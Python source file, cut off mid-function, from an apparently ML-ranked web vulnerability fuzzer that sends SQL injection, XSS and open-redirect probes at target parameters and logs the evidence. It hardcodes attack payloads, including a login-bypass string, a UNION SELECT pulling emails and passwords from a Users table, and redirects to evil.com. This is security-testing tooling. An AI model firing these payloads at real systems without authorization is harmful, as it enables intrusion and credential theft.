# backend/modules/fuzzer_core.py
from __future__ import annotations

import json
import time
import hashlib
import statistics
from pathlib import Path
from typing import Dict, Any, List, Tuple, Optional
from urllib.parse import urlparse, urlencode, urlunparse, parse_qs, quote

import httpx
from .detectors import (
    reflection_signals,
    sql_error_signal,
    score,
    open_redirect_signal,
    time_delay_signal,
    boolean_divergence_signal,
)

TRUNCATE_BODY = 2048

# ----------------------------- ML integration (confidence) -------------------
# Backward-compatible: existing attempt-level ML confidence (if present).
try:
    # returns {"p": float, "source": "ml|fallback|..."}
    from .ml_ranker import predict_proba as _ranker_predict  # type: ignore
    _ML_AVAILABLE = True
except Exception:
    _ML_AVAILABLE = False

    def _ranker_predict(features: Dict[str, Any]) -> Dict[str, Any]:  # type: ignore[no-redef]
        return {"p": 0.0, "source": "fallback"}

# ----------------------------- Stage A/B integration -------------------------
# Prefer canonical payload pools from family_router if present; otherwise use payloads.py
try:
    from .family_router import (
        FamilyClassifier,
        payload_pool_for as _payload_pool_for_router,
        decide_family as _router_decide_family,
        DEFAULT_MIN_PROB as _ROUTER_MIN_PROB,
        DEFAULT_EXPLORE_TOPK as _ROUTER_EXPLORE_TOPK,
    )
except Exception:
    FamilyClassifier = None  # type: ignore
    _payload_pool_for_router = None  # type: ignore
    _router_decide_family = None  # type: ignore
    _ROUTER_MIN_PROB = None
    _ROUTER_EXPLORE_TOPK = None

# Always try our curated pools as a fallback
try:
    from .payloads import payload_pool_for as _payload_pool_for_payloads
except Exception:
    _payload_pool_for_payloads = None  # type: ignore

# Recommender (Stage-B ranker and family-clf fallback)
try:
    from .recommender import Recommender
except Exception:
    Recommender = None  # type: ignore

# Singletons & caches
_FEATURE_CACHE: Dict[Tuple[str, str, str], Dict[str, Any]] = {}
try:
    # payload-agnostic endpoint features
    from .feature_extractor import FeatureExtractor  # type: ignore
    _FE = FeatureExtractor(headless=True)  # type: ignore
except Exception:
    _FE = None

_FAM = FamilyClassifier() if FamilyClassifier else None
_RECO = Recommender() if Recommender else None

# Defaults if router constants are missing
DEFAULT_MIN_PROB = float(_ROUTER_MIN_PROB) if _ROUTER_MIN_PROB is not None else 0.55
DEFAULT_EXPLORE_TOPK = int(_ROUTER_EXPLORE_TOPK) if _ROUTER_EXPLORE_TOPK is not None else 2


def _endpoint_key(t: Dict[str, Any]) -> Tuple[str, str, str]:
    return ((t.get("method") or "GET").upper(), t.get("url") or "", t.get("target_param") or "")


def _cheap_target_vector(t: Dict[str, Any]) -> Dict[str, Any]:
    """Very cheap feature proxy when real extractor isn't available."""
    method = (t.get("method") or "GET").upper()
    loc = (t.get("in") or "query").lower()
    ct = (t.get("content_type") or "").split(";")[0].lower()
    url = t.get("url") or ""
    param = (t.get("target_param") or "").lower()

    def depth(u: str) -> int:
        try:
            return sum(1 for seg in (urlparse(u).path or "").split("/") if seg)
        except Exception:
            return 0

    return {
        "method": method,
        "in": loc,
        "injection_mode": loc,              # hint for recommender heuristics
        "content_type": ct,
        "headers": dict(t.get("headers") or {}),
        "url": url,
        "param": param,
        "path_depth": depth(url),
        "param_len": len(param),
    }


def _endpoint_features(t: Dict[str, Any]) -> Dict[str, Any]:
    """Cache payload-agnostic endpoint features (robust to extractor API changes)."""
    k = _endpoint_key(t)
    if k in _FEATURE_CACHE:
        return _FEATURE_CACHE[k]

    feats: Dict[str, Any] = {}
    if _FE is not None:
        try:
            # Prefer the new endpoint-only API if present
            if hasattr(_FE, "extract_endpoint_features"):
                raw = _FE.extract_endpoint_features(
                    url=t.get("url"),
                    param=t.get("target_param") or t.get("param"),
                    method=(t.get("method") or "GET"),
                    content_type=t.get("content_type"),
                    headers=t.get("headers"),
                )
            else:
                # Older API sometimes returns (vec, meta)
                raw = _FE.extract_features(
                    t.get("url"),
                    t.get("target_param") or t.get("param"),
                    payload="",  # payload-agnostic
                    method=(t.get("method") or "GET"),
                    content_type=t.get("content_type"),
                )

            if isinstance(raw, dict):
                feats = raw
            elif isinstance(raw, tuple) and len(raw) >= 2 and isinstance(raw[1], dict):
                # (vec, meta) -> use meta as endpoint features
                feats = dict(raw[1])
            else:
                feats = _cheap_target_vector(t)
        except Exception:
            feats = _cheap_target_vector(t)
    else:
        feats = _cheap_target_vector(t)

    _FEATURE_CACHE[k] = feats
    return feats



# ---- canonical payload pool access ------------------------------------------

def payload_pool_for(family: str) -> List[str]:
    """
    Best-effort canonical pool resolution:
    1) family_router.payload_pool_for (if available)
    2) payloads.payload_pool_for (our curated pools)
    3) minimal hardcoded fallback
    """
    fam = (family or "").lower()
    if _payload_pool_for_router:
        try:
            return list(_payload_pool_for_router(fam))  # type: ignore[misc]
        except Exception:
            pass
    if _payload_pool_for_payloads:
        try:
            return list(_payload_pool_for_payloads(fam))
        except Exception:
            pass
    # minimal fallback
    if fam == "sqli":
        return ["' OR 1=1--", "') OR ('1'='1' -- ", "1 OR 1=1 -- ", "' UNION SELECT NULL-- "]
    if fam == "xss":
        return ['"/><script>alert(1)</script>', "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>"]
    if fam in ("redirect", "open_redirect"):
        return ["https://example.org/", "//evil.tld", "https:%2F%2Fevil.tld"]
    if fam == "base":
        return ["*", "%27", "%22", "()", "{}"]
    return []


# ---- helpers for negative feedback → recommender penalty --------------------

def _has_any_signal(detector_hits: Dict[str, bool]) -> bool:
    return any([
        detector_hits.get("sql_error"),
        detector_hits.get("boolean_sqli"),
        detector_hits.get("time_sqli"),
        detector_hits.get("xss_js"),
        (detector_hits.get("xss_raw") and not detector_hits.get("xss_html_escaped")),
        detector_hits.get("open_redirect"),
    ])


def _is_negative_attempt(detector_hits: Dict[str, bool], status_delta: int, len_delta: int, ms_delta: int) -> bool:
    return (not _has_any_signal(detector_hits)) and (status_delta == 0 and len_delta == 0 and ms_delta == 0)


def _bump_fail(feedback: Dict[str, int], fam: str, detector_hits: Dict[str, bool], status_delta: int, len_delta: int, ms_delta: int) -> None:
    if not fam:
        return
    if _is_negative_attempt(detector_hits, status_delta, len_delta, ms_delta):
        feedback[fam] = int(feedback.get(fam, 0)) + 1


# ---- Stage-A wrapper ---------------------------------------------------------

def _stage_a_decision(t: Dict[str, Any], *, recent_fail_counts: Optional[Dict[str, int]] = None) -> Dict[str, Any]:
    """
    Ask the Stage-A decider for family distribution + authoritative decision.

    Preference order:
    1) family_router.decide_family (if available)
    2) Recommender family classifier (via recommend_with_meta with family=None)
    3) Uniform prior fallback
    """
    # Router path
    if _router_decide_family is not None:
        inp = {
            "url": t.get("url"),
            "method": t.get("method"),
            "in": t.get("in"),
            "target_param": t.get("target_param"),
            "content_type": t.get("content_type"),
            "headers": t.get("headers"),
            "control_value": t.get("control_value"),
        }
        try:
            return _router_decide_family(inp, min_prob=DEFAULT_MIN_PROB, explore_topk=DEFAULT_EXPLORE_TOPK)  # type: ignore[misc]
        except Exception:
            # fall through to recommender-based path
            pass

    # Recommender family-clf path
    if _RECO is not None and hasattr(_RECO, "recommend_with_meta"):
        try:
            feats = _endpoint_features(t)
            # We don't actually need ranking here; we just want the meta.family_probs.
            fb = {"recent_fail_counts": dict(recent_fail_counts or {})} if recent_fail_counts else None
            _recs, meta = _RECO.recommend_with_meta(
                feats, pool=["*"], top_n=1, threshold=0.0, family=None, feedback=fb  # type: ignore[arg-type]
            )
            fam = meta.get("family") or None
            fam_probs = dict(meta.get("family_probs") or {})
            fam_decision = str(meta.get("family_decision") or "prior")
            # Decide exploration set
            ranked = sorted(fam_probs.items(), key=lambda kv: kv[1], reverse=True) or [("sqli", 0.34), ("xss", 0.33)]
            family_top, top_prob = ranked[0][0], float(ranked[0][1])
            threshold_passed = top_prob >= DEFAULT_MIN_PROB
            if threshold_passed:
                families_to_try = [family_top]
            else:
                families_to_try = [x for x, _ in ranked[:max(1, DEFAULT_EXPLORE_TOPK)]]
            return {
                "family_top": fam or family_top,
                "family_probs": fam_probs,
                "threshold_passed": threshold_passed,
                "families_to_try": families_to_try,
                "decision_reason": fam_decision,
                "min_prob": float(DEFAULT_MIN_PROB),
            }
        except Exception:
            pass

    # Ultra-safe uniform fallback
    fams = ["sqli", "xss", "redirect", "base"]
    probs = {f: (0.33 if f in ("sqli", "xss", "redirect") else 0.01) for f in fams}
    s = sum(probs.values()) or 1.0
    probs = {k: v / s for k, v in probs.items()}
    ranked = sorted([(f, p) for f, p in probs.items()], key=lambda kv: kv[1], reverse=True)
    top_family, top_prob = ranked[0]
    threshold_passed = top_prob >= DEFAULT_MIN_PROB
    fams_try = [top_family] if threshold_passed else [f for f, _ in ranked if f != "base"][:max(1, DEFAULT_EXPLORE_TOPK)]
    return {
        "family_top": top_family,
        "family_probs": probs,
        "threshold_passed": threshold_passed,
        "families_to_try": fams_try,
        "decision_reason": "rule_argmax" if threshold_passed else "below_threshold_explore",
        "min_prob": float(DEFAULT_MIN_PROB),
    }


# ---- Stage-B wrapper ---------------------------------------------------------

def _rank_payloads_for_family(
    feats: Dict[str, Any],
    family: str,
    top_n: int = 3,
    threshold: float = 0.2,
    *,
    recent_fail_counts: Optional[Dict[str, int]] = None,
) -> Tuple[List[Tuple[str, float]], Dict[str, Any]]:
    """
    Stage B: per-family payload ranking via LTR; fallback to curated pool.
    Returns ([(payload, prob)], meta)
    """
    fam = (family or "").lower()
    pool = payload_pool_for(fam)
    if not pool:
        return ([], {"used_path": "no_pool", "family": fam})

    if _RECO is not None:
        try:
            if hasattr(_RECO, "recommend_with_meta"):
                fb = {"recent_fail_counts": dict(recent_fail_counts or {})} if recent_fail_counts else None
                recs, meta = _RECO.recommend_with_meta(
                    feats, pool=pool, top_n=top_n, threshold=threshold, family=fam, feedback=fb  # type: ignore[arg-type]
                )
                return ([(p, float(prob)) for (p, prob) in recs], meta or {})
            else:
                recs = _RECO.recommend(feats, pool=pool, top_n=top_n, threshold=threshold, family=fam)  # type: ignore[arg-type]
                return ([(p, float(prob)) for (p, prob) in recs], {"used_path": "legacy_recommend", "family": fam})
        except Exception:
            pass

    # Fallback: naive order, uniform score
    out = [(p, 0.2) for p in pool[:top_n]]
    return (out, {"used_path": "heuristic", "family": fam})


# ---------------------------- small utils ------------------------------------

def _hash(s: str) -> str:
    return hashlib.sha1(s.encode("utf-8", "ignore")).hexdigest()


def _lower_headers(h: Dict[str, str]) -> Dict[str, str]:
    try:
        return {k.lower(): v for k, v in dict(h).items()}
    except Exception:
        out: Dict[str, str] = {}
        for k in h.keys():
            out[k.lower()] = h.get(k)
        return out


def _origin_host(url: str) -> str:
    try:
        return urlparse(url).netloc.lower()
    except Exception:
        return ""


def _origin_referer(url: str) -> str:
    try:
        u = urlparse(url)
        return f"{u.scheme}://{u.netloc}/" if u.scheme and u.netloc else ""
    except Exception:
        return ""


def _augment_headers(h: Dict[str, str], url: str) -> Dict[str, str]:
    """
    Add gentle browser-like defaults without clobbering provided values.
    Also nudge APIs to return JSON when likely.
    """
    out = dict(h or {})
    key = lambda k: next((kk for kk in out.keys() if kk.lower() == k.lower()), None)

    if not key("user-agent"):
        out["User-Agent"] = "Mozilla/5.0 (compatible; elise-fuzzer/1.0)"

    path = (urlparse(url).path or "").lower()
    wants_json = ("/api/" in path) or ("/rest/" in path)
    if not key("accept"):
        out["Accept"] = (
            "application/json, */*;q=0.8"
            if wants_json
            else "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        )

    if not key("accept-language"):
        out["Accept-Language"] = "en-US,en;q=0.8"

    if not key("referer"):
        ref = _origin_referer(url)
        if ref:
            out["Referer"] = ref

    return out


# ---------- Redirect influence gating helpers (reduce false positives) --------

_REDIRECT_PARAM_NAMES = {
    "to", "url", "next", "redirect", "return", "continue", "return_to", "redirect_uri", "callback"
}


def _host_from_url(u: Optional[str]) -> str:
    try:
        return urlparse(u or "").netloc.lower()
    except Exception:
        return ""


def _url_from_payload(p: str) -> Optional[str]:
    """
    Surface URL-ish payloads (http/https/// and common encoded variants).
    """
    try:
        s = p or ""
        if "%2f%2f" in s.lower():
            s = s.replace("%2F", "/").replace("%2f", "/")
        if s.startswith(("http://", "https://", "//")):
            return s if s.startswith(("http://", "https://")) else "http:" + s
    except Exception:
        pass
    return None


def _redirect_payload_influenced(
    baseline_loc: Optional[str],
    new_loc: Optional[str],
    payload: str,
    target_param: str,
) -> bool:
    """
    Consider 'open_redirect' only when the response Location is influenced by our payload:
    - Location changed from baseline, AND
    - Either the new Location host matches the payload host (if URL-ish), or payload appears in Location, OR
    - We mutated a known redirect-style parameter (permissive fallback).
    """
    new_loc = new_loc or ""
    base_loc = baseline_loc or ""
    if not new_loc:
        return False
    if new_loc == base_loc:
        return False

    mutated_redirect_param = (target_param or "").lower() in _REDIRECT_PARAM_NAMES

    pay_url = _url_from_payload(payload)
    if pay_url:
        pay_host = _host_from_url(pay_url)
        new_host = _host_from_url(new_loc)
        if pay_host and new_host and pay_host == new_host:
            return True
        if pay_url in new_loc:
            return True

    return mutated_redirect_param


# -------------------------- request mutation ---------------------------------

def _apply_payload_to_target(
    t: Dict[str, Any], payload: str, control: bool = False
) -> Tuple[str, Dict[str, str], Optional[str]]:
    """
    Build a concrete HTTP request for target `t` and `payload`.
    Returns (url, headers, body)
    """
    url = t["url"]
    headers = dict(t.get("headers") or {})
    body = t.get("body")

    value = t["control_value"] if control else payload
    target_param = t["target_param"]

    if t["in"] == "query":
        u = urlparse(url)
        q = parse_qs(u.query, keep_blank_values=True)
        q[target_param] = [value]
        new_qs = urlencode([(k, v) for k, vs in q.items() for v in (vs if isinstance(vs, list) else [vs])])
        url = urlunparse((u.scheme, u.netloc, u.path, u.params, new_qs, u.fragment))
        body = None  # GET
    else:
        ctype = (t.get("content_type") or "").split(";")[0].strip().lower()
        if ctype == "application/json":
            try:
                data = json.loads(body) if isinstance(body, str) else (body or {})
                if not isinstance(data, dict):
                    data = {}
            except Exception:
                data = {}
            data[target_param] = value
            body = json.dumps(data)
            headers["Content-Type"] = "application/json"
        else:
            p = parse_qs(body or "", keep_blank_values=True)
            p[target_param] = [value]
            body = urlencode([(k, v) for k, vs in p.items() for v in (vs if isinstance(vs, list) else [vs])])
            headers["Content-Type"] = "application/x-www-form-urlencoded"

    headers = _augment_headers(headers, url)
    return url, headers, body


# ------------------------------ transport ------------------------------------

def _send_once(
    client: httpx.Client,
    method: str,
    url: str,
    headers: Dict[str, str],
    body: Optional[str],
    timeout: float,
):
    try:
        if method.upper() == "GET":
            t0 = time.time()
            r = client.get(url, headers=headers, timeout=timeout)
            t1 = time.time()
        else:
            content = body.encode("utf-8") if isinstance(body, str) else body
            t0 = time.time()
            r = client.request(method.upper(), url, headers=headers, content=content, timeout=timeout)
            t1 = time.time()
        return r, None, (t1 - t0)
    except Exception as e:
        return None, {"type": type(e).__name__, "message": str(e)}, 0.0


def _send(
    client: httpx.Client,
    method: str,
    url: str,
    headers: Dict[str, str],
    body: Optional[str],
    timeout: float,
    repeats: int = 1,
):
    """
    Send the same request `repeats` times (for timing probes) and return:
    - last response (or None)
    - last error (or None)
    - list of elapsed seconds for each try
    """
    last_resp, last_err = None, None
    samples: List[float] = []
    for _ in range(max(1, repeats)):
        resp, err, elapsed = _send_once(client, method, url, headers, body, timeout)
        last_resp, last_err = resp, err
        samples.append(elapsed)
    return last_resp, last_err, samples


# ------------------------------- payloads ------------------------------------

def _looks_time_based(payload: str) -> bool:
    p = (payload or "").lower()
    return any(k in p for k in ("waitfor", "sleep(", "pg_sleep", "benchmark(", "dbms_lock.sleep"))


def _payload_family(p: str) -> str:
    """Lightweight classifier so the UI can show both payload class and signal family."""
    s = (p or "").lower()
    if any(x in s for x in ("<script", "<svg", "onerror=", "<img")):
        return "xss"
    if any(x in s for x in (" union ", " or ", " and ", "waitfor delay", "'--", "/*")) or s.startswith("'"):
        return "sqli"
    if s.startswith(("http://", "https://", "//")) or "%2f%2f" in s:
        return "redirect"
    return "base"


def _boolean_pairs_for(t: Dict[str, Any]) -> List[Tuple[str, str]]:
    """
    Generate conservative boolean TRUE/FALSE pairs regardless of context.
    We include quoted and unquoted variants to cover both string/number sinks.
    """
    pairs: List[Tuple[str, str]] = []

    # Quoted (string) style
    pairs.append(("' OR '1'='1' -- ", "' OR '1'='2' -- "))
    pairs.append(("') OR ('1'='1' -- ", "') OR ('1'='2' -- "))
    pairs.append(('") OR ("1"="1" -- ', '") OR ("1"="2" -- '))

    # Unquoted (numeric) style
    pairs.append(("1 OR 1=1 -- ", "1 AND 1=2 -- "))
    pairs.append((") OR (1=1) -- ", ") AND (1=2) -- "))

    # URL-encoded variants (cheap coverage for query)
    pairs.append((quote("' OR '1'='1' -- "), quote("' OR '1'='2' -- ")))
    pairs.append((quote("1 OR 1=1 -- "), quote("1 AND 1=2 -- ")))

    # Deduplicate
    seen = set()
    out: List[Tuple[str, str]] = []
    for a, b in pairs:
        key = (a, b)
        if key not in seen:
            out.append((a, b))
            seen.add(key)
    return out


def _generate_context_aware_payloads(t: Dict[str, Any]) -> List[str]:
    """
    Merge user-provided payloads with minimal context-aware probes so
    we can trigger real oracles without depending on pre-curated lists.
    """
    base = list(dict.fromkeys((t.get("payloads") or [])))  # dedupe, keep order
    auto: List[str] = []
    param = (t.get("target_param") or "").lower()
    url = t.get("url") or ""
    location = t.get("in")

    # JSON login bypass (typical)
    ctype = (t.get("content_type") or "").split(";")[0].strip().lower()
    looks_like_login = ("login" in url.lower()) or (param in ("email", "username", "user", "login"))
    if ctype == "application/json" and looks_like_login and location != "query":
        auto += ["' OR '1'='1' -- ", "' OR '1'='2' -- "]

    # Basic SQL error / boolean probes for search-like params
    if location == "query" and param in ("q", "query", "search", "s"):
        extra = [
            "'",  # error probe
            "') AND 1=1--",
            "') AND 1=2--",
            '") AND 1=1--',
            '") AND 1=2--',
            ") AND 1=1--",
            ") AND 1=2--",
        ]
        extra += [quote("') AND 1=1--", safe=""), quote("') AND 1=2--", safe="")]
        auto += extra
        # Opportunistic UNION (Juice Shop-like)
        auto += ["qwert')) UNION SELECT id, email, password, '4','5','6','7','8','9' FROM Users--"]

    # Open-redirect probes
    if location == "query" and param in (
        "to",
        "url",
        "next",
        "redirect",
        "return",
        "continue",
        "return_to",
        "redirect_uri",
        "callback",
    ):
        auto += [
            "http://evil.com",
            "https://evil.com",
            "//evil.com",
            "https:////evil.com",
            "http://evil.com@allowed.com",
            "https://allowed.com@evil.com",
            "%2f%2fevil.com",
        ]

    # Deduplicate but preserve order: base first, then auto, without repeats
    seen = set()
    out: List[str] = []
    for p in base + auto:
        if p not in seen:
            out.append(p)
            seen.add(p)
    return out


# -------------------------- inference (local) --------------------------------

def _make_detector_hits(
    refl: Dict[str, Any],
    sqlerr: bool,
    openredir: bool,
    time_sqli: bool,
    boolean_sqli: bool,
    hash_changed: bool,
    repeat_consistent: bool,
) -> Dict[str, bool]:
    """Flattened booleans for UI & inference."""
    return {
        "xss_raw": bool(refl.get("raw")),
        "xss_html_escaped": bool(refl.get("html_escaped")),
        "xss_js": bool(refl.get("js_context")),
        "sql_error": bool(sqlerr),
        "open_redirect": bool(openredir),
        "time_sqli": bool(time_sqli),
        "boolean_sqli": bool(boolean_sqli),
        "hash_changed": bool(hash_changed),
        "repeat_consistent": bool(repeat_consistent),
    }


def _infer_class(hits: Dict[str, bool], status_delta: int, len_delta: int) -> str:
    """
    Deterministic, conservative inference.
    """
    if hits.get("sql_error") or hits.get("boolean_sqli") or hits.get("time_sqli"):
        return "sqli"
    if hits.get("xss_js"):
        return "xss"
    if hits.get("xss_raw") and not hits.get("xss_html_escaped"):
        return "xss"
    if hits.get("open_redirect"):
        return "redirect"
    if abs(len_delta) > 300 and status_delta >= 1:
        return "suspicious"
    return "none"


def _append_evidence_line(fout, obj: Dict[str, Any]) -> None:
    fout.write(json.dumps(obj, ensure_ascii=False) + "\n")


# ------------------------------ attempts utils --------------------------------

def _attempt_request(
    client: httpx.Client,
    method: str,
    url: str,
    headers: Dict[str, str],
    body: Optional[str],
    timeout: float,
    repeats: int,
) -> Tuple[Optional[httpx.Response], Optional[Dict[str, str]], List[float]]:
    return _send(client, method, url, headers, body, timeout, repeats=repeats)


def _response_core(resp: httpx.Response) -> Tuple[str, str, int]:
    """Return (full_text, snippet, status)."""
    body_full = resp.text or ""
    snippet = body_full[:TRUNCATE_BODY]
    return body_full, snippet, resp.status_code


# --------------------------------- main --------------------------------------

def run_fuzz(job_dir: Path, targets_path: Path, out_dir: Optional[Path] = None) -> Path:
    """
    Executes control vs injected requests for each target param.
    Writes evidence to <job_dir>/results/evidence.jsonl
    """
    targets_obj = json.loads(targets_path.read_text("utf-8"))
    targets: List[Dict[str, Any]] = targets_obj.get("targets", [])

    results_dir = (out_dir or job_dir / "results")
    results_dir.mkdir(parents=True, exist_ok=True)
    evidence_path = results_dir / "evidence.jsonl"

    # Track recent per-family negatives to inform the ranker penalty
    recent_fail_counts: Dict[str, int] = {"sqli": 0, "xss": 0, "redirect": 0}

    # We want 3xx Location for open-redirect detection -> don't auto-follow
    with httpx.Client(follow_redirects=False) as client, evidence_path.open("w", encoding="utf-8") as fout:
        for t in targets:
            method = t["method"].upper()
            timeout = float(t.get("timeout", 12.0))

            # CONTROL (baseline)
            u_ctrl, h_ctrl, b_ctrl = _apply_payload_to_target(t, t["control_value"], control=True)
            r0, err0, samples0 = _attempt_request(client, method, u_ctrl, h_ctrl, b_ctrl, timeout, repeats=1)

            if err0 is not None:
                _append_evidence_line(
                    fout,
                    {
                        "type": "baseline_error",
                        "job": job_dir.name,
                        "target_id": t["id"],
                        "method": method,
                        "in": t["in"],
                        "param": t["target_param"],
                        "url": u_ctrl,
                        "headers": h_ctrl,
                        "body": b_ctrl,
                        "error": err0,
                    },
                )
                continue

            # Baseline success -> record it
            body0_full, body0_snip, s0 = _response_core(r0)  # type: ignore[arg-type]
            l0 = len(body0_snip)
            baseline_hash = _hash(body0_snip)
            baseline_ms = int(statistics.median(samples0) * 1000)
            baseline_headers = _lower_headers(r0.headers)  # type: ignore[arg-type]
            baseline_location = baseline_headers.get("location")

            _append_evidence_line(
                fout,
                {
                    "type": "baseline",
                    "job": job_dir.name,
                    "target_id": t["id"],
                    "method": method,
                    "in": t["in"],
                    "param": t["target_param"],
                    "url": u_ctrl,
                    "headers": h_ctrl,
                    "body": b_ctrl,
                    "status": s0,
                    "length": len(body0_full),
                    "elapsed_ms": baseline_ms,
                    "timing_samples_ms": [int(s * 1000) for s in samples0],
                    "response_hash": baseline_hash,
                    "response_headers": {
                        "content-type": baseline_headers.get("content-type"),
                        "location": baseline_location,
                        "set-cookie": baseline_headers.get("set-cookie"),
                    },
                },
            )

            origin = _origin_host(t["url"] or "")

            # -------------------- BOOLEAN-PAIR ORACLE PASS --------------------
            seen_payloads: set[str] = set()
            for p_true, p_false in _boolean_pairs_for(t):
                # TRUE
                u_t, h_t, b_t = _apply_payload_to_target(t, p_true, control=False)
                r_t, err_t, smp_t = _attempt_request(client, method, u_t, h_t, b_t, timeout, repeats=1)
                if err_t is None and r_t is not None:
                    body_t_full, body_t_snip, st_t = _response_core(r_t)
                    len_t = len(body_t_snip)
                    hash_t = _hash(body_t_snip)
                    elapsed_t = int(statistics.median(smp_t) * 1000)
                else:
                    body_t_full, body_t_snip, st_t = "", "", 0
                    len_t, hash_t, elapsed_t = 0, "", 0

                # FALSE
                u_f, h_f, b_f = _apply_payload_to_target(t, p_false, control=False)
                r_f, err_f, smp_f = _attempt_request(client, method, u_f, h_f, b_f, timeout, repeats=1)
                if err_f is None and r_f is not None:
                    body_f_full, body_f_snip, st_f = _response_core(r_f)
                    len_f = len(body_f_snip)
                    hash_f = _hash(body_f_snip)
                    elapsed_f = int(statistics.median(smp_f) * 1000)
                else:
                    body_f_full, body_f_snip, st_f = "", "", 0
                    len_f, hash_f, elapsed_f = 0, "", 0

                # Log attempts (both sides)
                for (lbl, uX, hX, bX, stX, bodyX_full, bodyX_snip, elapsedX, smpX, errX, pX) in [
                    ("attempt", u_t, h_t, b_t, st_t, body_t_full, body_t_snip, elapsed_t, smp_t, err_t, p_true),
                    ("attempt", u_f, h_f, b_f, st_f, body_f_full, body_f_snip, elapsed_f, smp_f, err_f, p_false),
                ]:
                    _append_evidence_line(
                        fout,
                        {
                            "type": "attempt" if errX is None else "attempt_error",
                            "job": job_dir.name,
                            "target_id": t["id"],
                            "method": method,
                            "in": t["in"],
                            "param": t["target_param"],
                            "url": uX,
                            "headers": hX,
                            "body": bX,
                            "payload_string": pX,
                            "payload_family_used": _payload_family(pX),
                            "status": stX,
                            "length": len(bodyX_full),
                            "elapsed_ms": elapsedX,
                            "timing_samples_ms": [int(s * 1000) for s in smpX],
                            "response_hash": _hash(bodyX_snip),
                            "payload_origin": "curated",
                            "ranker_meta": {
                                "family_probs": None,
                                "family_chosen": "sqli",  # boolean oracle implies sqli intent
                                "ranker_score": None,
                                "model_ids": None,
                            },
                            **({"error": errX} if errX is not None else {}),
                        },
                    )

                # Compute boolean divergence
                metrics_true = {"status": st_t, "len": len_t, "hash": hash_t}
                metrics_false = {"status": st_f, "len": len_f, "hash": hash_f}
                boolean_hit = boolean_divergence_signal(metrics_true, metrics_false)

                if boolean_hit:
                    # Build pair deltas
                    status_delta_pair = abs(st_t - st_f)
                    len_delta_pair = abs(len_t - len_f)
                    ms_delta_pair = abs(elapsed_t - elapsed_f)

                    # Heuristic score for the pair
                    findings_pair = {
                        "reflection": {},
                        "sql_error": False,
                        "open_redirect": False,
                        "boolean_sqli": True,
                        "time_sqli": False,
                        "hash_changed": (hash_t != hash_f),
                        "repeat_consistent": True,
                    }
                    conf_pair = score(findings_pair, status_delta_pair, len_delta_pair, ms_delta_pair)

                    # Attempt-level ML (old path) for the pair
                    try:
                        ml_in_pair = {
                            "detector_hits": {"boolean_sqli": True},
                            "status_delta": status_delta_pair,
                            "len_delta": len_delta_pair,
                            "latency_ms_delta": ms_delta_pair,
                            "payload_family_used": "sqli",
                            "pair": True,
                            "method": method,
                            "in": t["in"],
                        }
                        ml_out_pair = _ranker_predict(ml_in_pair)
                    except Exception:
                        ml_out_pair = {"p": 0.0, "source": "fallback_error"}

                    ml_conf_pair = float(ml_out_pair.get("p", 0.0))
                    ml_conf_pair = max(ml_conf_pair, 0.95)  # strong oracle floor
                    conf_pair = max(conf_pair, ml_conf_pair)

                    _append_evidence_line(
                        fout,
                        {
                            "type": "finding",
                            "oracle": "boolean_pair",
                            "job": job_dir.name,
                            "target_id": t["id"],
                            "method": method,
                            "in": t["in"],
                            "param": t["target_param"],
                            "url": t["url"],
                            "content_type": t.get("content_type"),
                            "payload_true": p_true,
                            "payload_false": p_false,
                            "detector_hits": {"boolean_sqli": True},
                            "inferred_vuln_class": "sqli",
                            "status_delta": status_delta_pair,
                            "len_delta": len_delta_pair,
                            "latency_ms_delta": ms_delta_pair,
                            "ml": {"p": ml_conf_pair, "source": ml_out_pair.get("source"), "enabled": _ML_AVAILABLE},
                            "confidence": conf_pair,
                            "payload_origin": "curated",
                            "ranker_meta": {
                                "family_probs": None,
                                "family_chosen": "sqli",
                                "ranker_score": None,
                                "model_ids": None,
                            },
                            "request_true": {"url": u_t, "headers": h_t, "body": b_t},
                            "request_false": {"url": u_f, "headers": h_f, "body": b_f},
                            "response_true": {"status": st_t, "length": len(body_t_full), "elapsed_ms": elapsed_t},
                            "response_false": {"status": st_f, "length": len(body_f_full), "elapsed_ms": elapsed_f},
                        },
                    )

                # Avoid double-processing these in the generic/ML loops
                seen_payloads.add(p_true)
                seen_payloads.add(p_false)

            # -------------------- STAGE A+B (ML-ranked payloads) --------------------
            feats = _endpoint_features(t)
            decision = _stage_a_decision(t, recent_fail_counts=recent_fail_counts)
            family_probs = decision.get("family_probs", {})
            family_top = decision.get("family_top")
            threshold_passed = bool(decision.get("threshold_passed"))
            families_to_try = list(decision.get("families_to_try") or ([] if family_top is None else [family_top]))

            # Budget: if threshold passed, use chosen family (top_n=3); else explore top-k with top_n=1 each
            plan: List[Tuple[str, int]] = []
            if threshold_passed and family_top:
                plan.append((family_top, 3))
            else:
                for fam in families_to_try:
                    plan.append((fam, 1))

            # Execute per plan
            for fam, top_n in plan:
                recs, meta = _rank_payloads_for_family(
                    feats, fam, top_n=top_n, threshold=0.2, recent_fail_counts=recent_fail_counts
                )
                # Nothing to do
                if not recs:
                    continue

                # Fire candidates in the given order (ranked)
                for payload, p_ml in recs:
                    if payload in seen_payloads:
                        continue
                    u1, h1, b1 = _apply_payload_to_target(t, payload, control=False)
                    repeats = 3 if _looks_time_based(payload) else 1
                    r1, err1, samples = _attempt_request(client, method, u1, h1, b1, timeout, repeats=repeats)

                    # Build common ranker_meta (Stage-A + Stage-B)
                    family_prob = float(family_probs.get(fam, 0.0))
                    ranker_meta = {
                        "family_probs": family_probs,
                        "family_top": family_top,
                        "family_chosen": fam,
                        "threshold_passed": threshold_passed,
                        "families_to_try": families_to_try,
                        "decision_reason": decision.get("decision_reason"),
                        "min_prob": decision.get("min_prob"),
                        "ranker_score": float(p_ml),
                        "ranker": (meta or {}),
                    }

                    if err1 is not None:
                        _append_evidence_line(
                            fout,
                            {
                                "type": "attempt_error",
                                "job": job_dir.name,
                                "target_id": t["id"],
                                "method": method,
                                "in": t["in"],
                                "param": t["target_param"],
                                "payload_string": payload,
                                "payload_family_used": fam or _payload_family(payload),
                                "payload_origin": "ml",
                                "ranker_meta": ranker_meta,
                                "url": u1,
                                "headers": h1,
                                "body": b1,
                                "error": err1,
                                "timing_samples_ms": [int(s * 1000) for s in samples],
                            },
                        )
                        continue

                    # Bodies & headers
                    body1_full, body1_snip, status1 = _response_core(r1)  # type: ignore[arg-type]
                    resp_headers = _lower_headers(r1.headers)

                    # Signals
                    refl = reflection_signals(body1_full, payload)
                    sqlerr = sql_error_signal(body1_full)
                    loc_hdr = resp_headers.get("location")
